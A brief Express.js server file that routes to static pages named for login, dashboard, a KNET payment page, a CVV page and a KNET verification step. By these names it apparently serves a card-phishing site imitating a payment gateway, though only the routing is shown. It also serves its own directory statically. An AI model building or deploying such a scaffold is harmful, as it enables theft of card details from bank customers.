const express = require('express');
const path = require('path');
const app = express();

app.use(express.static(path.join(__dirname)));
app.use(express.urlencoded({ extended: true }));
app.use(express.json());

// Routes
app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'index.html')));
app.get('/hawety', (req, res) => res.sendFile(path.join(__dirname, 'hawety.html')));
app.get('/login', (req, res) => res.sendFile(path.join(__dirname, 'login.html')));
app.get('/dashboard', (req, res) => res.sendFile(path.join(__dirname, 'dashboard.html')));
app.get('/knetpage', (req, res) => res.sendFile(path.join(__dirname, 'knetpage.html')));
app.get('/cvv', (req, res) => res.sendFile(path.join(__dirname, 'cvv.html')));
app.get('/knet/ver', (req, res) => res.sendFile(path.join(__dirname, 'knet/ver.html')));

// 404 handler
app.use((req, res) => res.sendFile(path.join(__dirname, 'index.html')));

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
